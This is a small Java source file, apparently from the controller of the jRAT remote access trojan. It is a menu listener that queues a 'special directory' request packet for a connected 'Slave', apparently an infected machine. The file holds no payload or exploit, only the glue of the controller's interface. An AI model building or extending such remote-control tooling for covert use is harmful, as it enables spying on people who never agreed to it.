package io.jrat.controller.listeners;

import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet41SpecialDirectory;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenuItem;


public class DirListener implements ActionListener {

	private Slave sl;
	private int location;

	public DirListener(Slave slave, int location) {
		this.sl = slave;
		this.location = location;
	}

	public void actionPerformed(ActionEvent arg0) {
		sl.addToSendQueue(new Packet41SpecialDirectory(location));
	}

}
